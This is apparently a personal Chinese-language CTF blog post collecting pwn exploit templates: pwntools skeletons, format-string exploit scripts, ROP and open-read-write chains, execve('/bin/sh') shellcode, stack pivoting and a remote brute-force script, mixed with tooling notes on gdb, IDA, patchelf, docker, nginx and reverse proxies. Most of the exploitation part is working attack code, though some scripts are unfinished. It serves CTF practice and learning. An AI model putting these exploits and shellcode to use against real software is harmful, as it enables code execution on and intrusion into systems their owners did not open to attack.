---
title: pwn题板子
date: 2023-01-06 00:28:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=50/
pin: false
published:
---

## 基础模板📓

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ia()
```

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(bytes(data))
sa      = lambda text,data          :p.sendafter(text, bytes(data))
sl      = lambda data               :p.sendline(bytes(data))
sla     = lambda text,data          :p.sendlineafter(text, bytes(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
l64     = lambda                    :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ia()
```

精简版

```python
# _*_ coding:utf-8 _*_

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')


p.interactive()
```



## PWN💥总要有点手法


### pigcha重置网络

```
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
```

### Docker with Pwn






### Patch指令

```shell
patchelf --set-interpreter ~/Desktop/ld-linux-x86-64.so.2 --set-rpath ~/Desktop/ qwarmup

patchelf  --set-interpreter  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 --set-rpath /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libreadline.so.6

```

### AWD出题经验
#### 编译指令
```shell
 -fno-stack-protector


NX：-z execstack / -z noexecstack (关闭 / 开启) 堆栈不可执行
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息
ASLR和PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限
asm：内联汇编 -masm=intel
-s：去除符号表
-m32 编译32位


一般题目需要
# 变成fastcall
-O2

strip ./pwn


```





### 无线安全

2.4GHz与5GHz都属于无线电（频率在3Hz-300Hz范围内的电磁波）的频段范围
赫兹（Hz）到兆赫兹（MHz）和千兆赫兹（GHz）

### CMSweb框架查找

https://www.yunsee.cn/



### 安卓刷机

卡刷（recovery）
将完整的刷机包放入手机的sdcard中
手机进入recovery模式直接安装，整个安装不需要电脑参与
简单快捷，不易出错，适合新手

线刷（fastboot）
刷机包在电脑中，利用刷机软件对手机进行刷机
实际上手机进入了fastboot模式
需要电脑安装好手机驱动并连接
容易出错，一般用来救砖


OTA（Android OS）
Over-The-Air 空中下载技术
就是手机设置中更新操纵系统，下载补丁包，文件不大
手机就在Android OS层面完成了补丁的下载，并自动更新
一般手机root后将不再提供系统更新

刷机包：ROM(操作系统文件包){内核  基带：决定了手机可以使用的运营商服务}
### DNS劫持

```
114.114.114.114 //114 dns 由中国电信运营商提供
8.8.8.8   // google dns

nslookup [域名或IP地址] [DNS服务器]


# 检测
nslookup whether.114dns.com 114.114.114.114
返回回环地址127.0.0.1即被劫持，否则为公网IP
大多数劫持udp 53的dns


# 强制使用tcp解析域名
nslookup -vc whether.114dns.com 114.114.114.114
```

### tips收集

```python
chr() # 16进制转字符
ord() # 字符转16进制
％.* s # 表示从以下缓冲区打印前X个字符
[rax] 取值
# 指针变量
	类型是int*
	p = p+1;# +8(1*int)
    赋值语句:赋给谁
    a = 3
    0x1234 a 0x0000003 0x0000000
    a变量地址 = 3

# 后三位置零(C语言)
stack_addr = stack_addr & (~0xfff);

# 关闭ALSR
echo 0 > /proc/sys/kernel/randomize_va_space

# 切换python版本
sudo update-alternatives --config python

# 本地patchelf
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath ./ qwarmup
patchelf --set-interpreter ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ld-linux-x86-64.so.2 --set-rpath ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ ./pwn


# 虚拟机 vscode
sudo apt install openssh-server
service sshd start

# busybox
busybox mkdir -p /usr/bin
busybox --install -s /usr/bin

# ida使用技巧
shift+E # 导出数据

# 网络启动
sudo nmcli networking on

# /bin/sh
sh = 0x68732f6e69622f

# tor爬虫验证
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs

# 应用qiling环境
source ~/qilingenv/bin/activate

# 软连接
ln -s cgibin hedwig.cgi
hedwig,cgi-> cgibin

# ida 转 ascii码
选中区域按a

# 寻找为转化字符地址
扔进01editor搜索

# ida
用到了再更新
空格键 ：反汇编窗口切换文本跟图形
ESC退到上一个操作地址
G搜索地址或者符号
N重命名
分号键 ：注释
ALT+M 添加标签
CTRL+M 列出所有标签
CTRL +S 二进制段的开始地址结束地址
C code 光标地址出内容解析成代码
P 在函数开始处使用P，从当前地址处解析成函数
D data解析成数据
A ASCII解析成ASCII
U unDefined解析成未定义的内容
X 交叉引用
F5 C伪代码
菜单栏中的搜索功能中
有ALT+T 搜索文本
ALT+B 搜索16进制 搜索opcode 如ELF文件头
打开断点列表 CTRL+ALT+B
单步步入 F7
单步不过 F8
运行到函数返回地址 CTRL+F7
运行到光标处 F4

shift+E 导出数据，可提取一些数据
shift+? 计算器


# 后台运行 gohttpserver
sudo nohup ./gohttpserver -r ../share --port 80 1>/dev/null 2>&1 &

# 快速起题目和端口
socat tcp-l:8888,reuseaddr,fork exec:./blind
```


### glibc对应版本docker拉取
```
google 搜索关键字 dockerhub 2.37-0ubuntu1
```


### hyper-V 和 VMware 切换

关闭hyper-V

wifi网络适配器右键取消桥接！

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/ccfaeb528b034a12b43b5bc415d209e5.png" alt="在这里插入图片描述" style="zoom: 33%;" />

```bash
bcdedit /set hypervisorlaunchtype off
bcdedit /set hypervisorlaunchtype auto
```

启用hyper-V

新建外部虚拟网络

### 服务器nginx服务器

```bash
# 安装
sudo apt-get install nginx
# which nginx
# /usr/sbin/nginx -t
sudo nano /etc/nginx/conf.d/file_server.conf

server {
  listen 80; 
  server_name e4l4.com; # 自己PC的ip或者服务器的域名 
  charset utf-8; # 避免中文乱码 
  root /home/lighthouse/share; # 存放文件的目录 
  location / { 
    autoindex on; # 索引 
    autoindex_exact_size on; # 显示文件大小 
    autoindex_localtime on; # 显示文件时间 
  }
}

sudo rm /etc/nginx/sites-enabled/default
sudo service nginx reload


# 关于nginx的命令
sudo /etc/init.d/nginx start|stop|reload|
sudo service nginx start|stop|reload|

```



### docker命令

```bash
# 构建镜像：
docker build -f /path/Dockerfile -t imgname(tag)
docker images
docker run -itd --name ycbsql -p 9999:9999 ycbsql
docker ps

# 查看项目运行日志
docker logs --tail 500 ycbsql

docker exec -it 115e791688f1 "/bin/bash"
```

### 反向代理

iox 反向代理

```bash
./iox proxy -l 9999 -l 1080

./iox proxy -r e4l4.com:9999
iox.exe proxy -r e4l4.com:9999
```

frp反向代理

```shell
# 外网端
./frps -c frps.ini

# 内网端
./frpc -c frpc.ini
```





### GDB调试技巧

```shell
# 调试进程
sudo gdb -p <pid>

# 调试多线程 https://blog.csdn.net/gatieme/article/details/78309696
set follow-fork-mode [parent|child]		# 设置调试[父进程/子进程]
set detach-on-fork [on|off]				# 未调试进程[继续执行/block在fork位置]
show follow-fork-mode
show detach-on-fork
info inferiors				# 查看正在调试的进程信息
info threads				# 查询线程
thread <thread number>		# 切换线程


# strace -ff -o test.txt ./dns -C ./dns.conf
```

```shell
# 设置寄存器
set $rax=0
```

### 栈对齐

```c
movaps xmmword ptr [rsp + 0x50], xmm0
```

使用 **XMM** 时，需要 **16Byte** 对齐；使用 **YMM** 时，需要 **32Byte** 对齐；使用 **ZMM** 时，需要 **64Byte** 对齐。



### shellcode(汇编)



```
mov        一个变量或者寄存器， 一个变量或者寄存器里边的值
lea          一个变量或者寄存器,    一个变量或者寄存器


cdq    执行后rdx的值为0x00000000或0xFFFFFFFF  
#  字节码为"\x99" 表示“转换双字为四字” 在执行`cdq`指令时，它会检查`EAX`寄存器中的符号位（第31位），将eax扩展后的符号位复制到edx中

jmp $-0x19  # 短跳转 相对RIP

```





read()

```assembly
    mov rdi, r15
    xor eax, eax
    cdq
    mov al, 10
    mov dl, 7
    syscall # mprotect
    
    xor eax, eax
    mov esi, edi
    mov edi, eax
    mov dl, 0x7f
    syscall # read
    
# 添加nop
p.send('\x90' * 0x16 + asm('''
    mov rsp, rsi
    add rsp, 0x1000

    xor rsi, rsi
    mul rsi # rax = 0

    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    mov al, 59

    syscall # execve("/bin/sh",0,0)
'''))
```







### docker 网桥删除

根据你提供的网络设备信息，你有很多 Docker 网络桥（br-02e7e9c790be，br-1df37dd21e5b，br-4e91b786b58e）以及一个默认的 Docker 网络桥（docker0）。要删除这些 Docker 网络桥，你可以使用 Docker 的命令行工具。

在 Docker 中，你可以使用 `docker network ls` 命令来查看所有的网络。你可以看到每个网络的 ID、名称、驱动和范围。然后你可以使用 `docker network rm` 命令来删除特定的网络。你需要用网络的 ID 或者名称作为参数。

例如，要删除一个名为 `my_network` 的网络，你可以运行以下命令：

```
docker network rm my_network
```

如果你想要删除所有的网络，你可以将 `docker network ls` 的输出（也就是所有网络的 ID）传递给 `docker network rm` 命令。下面是一个删除所有网络的 Bash 脚本：

```
docker network ls -q | xargs docker network rm
```

这个脚本首先会用 `docker network ls -q` 来获取所有网络的 ID，然后用 `xargs` 将这些 ID 作为参数传递给 `docker network rm`，从而删除所有的网络。

请注意，运行这个脚本需要 Docker 的相关权限。如果你在运行这个脚本时遇到了权限问题，你可能需要以管理员身份运行这个脚本。此外，如果一个网络正在被一个或多个容器使用，你需要先停止和删除这些容器，才能删除该网络。

### 随机数调用

```python
# 随机数调用
from ctypes import *
libc1 = cdll.LoadLibrary('./libc-2.31.so')
libc1.srand(0)
j = str((libc1.rand()+1)%3)
```

### Z3解释器

```python
# _*_ coding:utf-8 _*_
from z3 import *

# 生成V3-V18变量
for i in range(3,19):
  locals()['v'+ str(i)]= Int('v%s'%i)

# x = Real('x') # 有理数

s = Solver()
s.add(v5 * v4 * v3 - v6 == 36182)
s.add(v3 == 19)
s.add(v5 * 19 * v4 + v6 == 36322)
s.add((v13 + v3 - v8) * v16 == 32835)
s.add((v4 * v3 - v5) * v6 == 44170)
s.add((v5 + v4 * v3) * v6 == 51590)
s.add(v9 * v8 * v7 - v10 == 61549)
s.add(v10 * v15 + v4 + v18 == 19037)
s.add(v9 * v8 * v7 + v10 == 61871)
s.add((v8 * v7 - v9) * v10 == 581693)
s.add(v11 == 50)
s.add((v9 + v8 * v7) * v10 == 587167)
s.add(v13 * v12 * v11 - v14 == 1388499)
s.add(v13 * v12 * v11 + v14 == 1388701)
s.add((v12 * v11 - v13) * v14 == 640138)
s.add((v11 * v5 - v16) * v12 == 321081)
s.add((v13 + v12 * v11) * v14 == 682962)
s.add(v17 * v16 * v15 - v18 == 563565)
s.add(v17 * v16 * v15 + v18 == 563571)
s.add(v14 == 101)
s.add((v16 * v15 - v17) * v18 == 70374)
s.add((v17 + v16 * v15) * v18 == 70518)


if s.check() == sat:
  result = s.model()
  print result

```



### 爆破脚本

如果是覆盖返回地址得爆破

```python
count=1

while true :
        p=remote("nc.eonew.cn",10002)
        p.send('A'*0x80+'A'*8+'\xa6\x15\x04') #注意不能用sendline否则会读取'\n'
        p.recv()
        print(count)
        count += 1
        try:    
               p.recv(timeout=0.2)# [*] Got EOF while reading in interactive 转化为 Traceback
               p.recv(timeout=0.2)
        except:
               p.close()
               continue
        break
ia()
```





## 经验与判断🧠

scanf读入堆块 == 堆溢出

计算器题目

通常用栈作为计算的位置，即存放计算的过程信息，+-符号等

输出结果的地方用数组引索数组越界 == 泄露libc





size位为什么要除以8









## fmt

关于减去字节数
%是一个字节，p是一个字节，数字部分按10进制算，一个数字是一个字节，h是一个字节，n是一个字节
但是减去前边的字节数不包括当前的这个%号！即
%2p   减2


###  非栈上一次改ebp链

fmt工具看下第一次改的地址偏移，如果是11 就给11-2个p
关于减去前边多少的内容，减去的值为%p输出的长度

```python
pay = "%p"*0x9+ '%'+str(0)+'c%hn'  # 测出前边有多少个字节 数字-1即可
pay += '%' + str((0x23+0xd8)) + 'c%37$hhn'

s(pay)

# print(hex(len('0x5624b86d10400x1000x7f67d9d161510xb(nil)0x7ffcdaca6cf00x93e041eb8ec261000x5624b86ce2600x7f67d9c27bf7')))

# 0x65
```

### 栈上

```python
# fmtstr_payload
payload ="%2c%310$hhn;%310$p".ljust(0x18)# 修改栈上的某个值为2/泄露libc
payload += fmtstr_payload(9,{ret_addr:start}, numbwritten=0x17)# 修改返回地址为start


# 第一个参数：fmtstr开始的地方的偏移(题目输入偏移是6，fmtstr_payload开始的地方偏移是9)
# 第二个参数：ret_addr : aaa -> bbb  将aaa改为start
# 第三个参数：numbwritten: fmtstr_payload用%c构成读入字节数，这里fmtstr_payload前边有内容所以要剪掉字节长,0x17 = 0x18-1

```



### 堆上

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1","10000")
p = process("./shell")
elf = ELF("./shell")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# 泄露libc和栈地址
sa("> ",'echo '+'%6$p-%10$p')
sa("> ",'cat')
ru('0x')
libc_base = int(p.recv(12),16)-libc.sym['_IO_file_jumps']
lg('libc_base')
one = libc_base + 0xe3b01 
lg('one')
ru('0x')
stack_addr= int(p.recv(12),16)
lg('stack_addr')
ret = stack_addr+0x8
lg('ret')

# aaa(%17$p) : bbb(%45$p) -> ccc 
# aaa(%17$p) : bbb(%45$p) -> ret -> libc_function
# 改aaa的偏移即改ccc

sa("> ",'echo '+'%' + str(ret & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one & 0xffff) + 'c%45$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str((ret+2) & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one>>16 & 0xff) + 'c%45$hhn')
sa("> ",'cat')

sa("> ",'exit\n')

ia()
```

### bss上

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote('node4.buuoj.cn', 29966) 
# p = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

buf = 0x804A060+0x4
shellcode = asm(shellcraft.i386.linux.sh())

sl("%6$p")
ru("0x")
stack = int(p.recv(8),16)
lg('stack')
ret = stack-0xc

pay = '%' + str(ret & 0xff) + 'c%6$hhn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = '%' + str(buf & 0xffff) + 'c%10$hn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = 'quit' + shellcode
s(pay)

ia()
```







## orw

### gadget

这种优先级最高，要先迁移到bss段上(本地打在当前目录建一个flag)

```python
shellcode = asm(
'''
    mov eax, 0x67616c66 ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall ;// write open() return value

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall ;// write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit
'''
)
pay = (#cyclic(64)# + flat(
[
    #0, 
    pop_rdi, 0x601000, 
    pop_rsi, 0x2000, 
    pop_rdx, 7,
    mprotect,
    jmp_rsp
]) + shellcode).ljust(0x100, b'\0')


```



下边2种通常需要调整gadget，而且还需要找个地方写入/flag

```python
pay = p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```



Open->openat 可能会不可用

```python
pay = p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```



orw-shellcode 汇编

```python
nop #1字节
pop rdi # 1字节
xor esi, esi #2字节
xor rsi, rsi #3字节
sub rsp, 0x30 #4字节
jmp rsp #2字节
mov rax, 0 #7字节 
mov eax, 0 #5字节
syscall #2字节
```

### 栈迁移/orw_shellcode

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

pop_rdi = 0x0000000000401393
pop_rsi = 0x0000000000401391
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

read = 0x4012CF
main = 0x4012C0
bss = 0x404200
#-------------------泄露libc-------------------------
# 如果一点都不够就直接栈迁移，泄露以后再继续栈迁移
ru("before you try to solve this task.")
pay = 'a'*0x100+p64(bss)+p64(read)
s(pay)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
s(pay)
pay = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
s(pay)

# 如果有一定空间（>=0x20）可实现栈迁移
pay = 'a'*0x20+p64(bss)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(read)
s(pay)
pay = 'a'*0x20+p64(bss+0x20)+p64(read)
s(pay)# 后续就可以orw或者mprotect改权限


# 如果仅有read函数的情况



libc_base = l64()-0x
lg('libc_base')
pop_rdx = libc_base + 0x0000000000142c92
jmp_rsp = libc_base+0x0000000000002b25
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
# 二选一
# mprotect = libc_base + libc.sym['mprotect']
# syscall = libc_base + 0xd2625

flag = 'flag'
pay = p64(0)+p64(pop_rdi)+p64(bss-0x500)
pay += p64(pop_rsi)+p64(0x1000)
pay += p64(pop_rdx)+p64(7)
pay += p64(pop_rax)+p64(10)
pay += p64(syscall)
pay += p64(jmp_rsp)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
ru("let me guess\n")
s(payload)

# 可用的shellcode
# get flagname
pay = asm(shellcraft.open('./'))
pay += asm(shellcraft.getdents64(3, bss+0x300, 0x100))
pay += asm(shellcraft.write(1, bss+0x300, 0x100))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))# 等价于call main
s(pay)
ru("flag")
flagname='flag'+p.recv(20)
print(flagname)

# cat flag 1
flag = 'flag'
pay = asm(shellcraft.cat(flag))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
s(pay)
# cat flag 2
pay += asm(shellcraft.open((flagname)))
pay += asm(shellcraft.read(3, bss+0x700, 0x400)) # pay += shellcraft.read(3,'rsp',0x100)
pay += asm(shellcraft.write(1,bss+0x700, 0x400)) # pay += shellcraft.write(1,'rsp',0x100)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))
s(pay)

#--------------------直接orw----------------------
flag = 0x404200
pay = 'flag'.ljust(8,'\x00')+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(0)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
sl(pay)

ia()
```

### orw涉及到堆，就需要srop来free_hook段改权限实现orw

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size):
    sla("4.show\n",'1')
    sla("Size of Heap : \n",size)

def dele(idx):
    sla("4.show\n",'2')
    sla("Index :\n",idx)

def edit(idx,size,con):
    sla("4.show\n",'3')
    sla("Index :\n",idx)
    sla("Size of Heap : \n",size)
    sa("Content of heap : \n",con)
def show(idx):
    sla("4.show\n",'4')
    sla("Index :\n",idx)

#------------------------泄露libc------------------------------
# 堆的思路比较复杂,首先利用漏洞点泄露libc
pop_rdi = libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi = libc_base+libc.search(asm("pop rsi\nret")).next()
pop_rdx = libc_base+libc.search(asm("pop rdx\nret")).next()
pop_rax = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
syscall = libc_base+libc.search(asm("syscall\nret")).next()
mprotect = libc_base + libc.sym['mprotect']

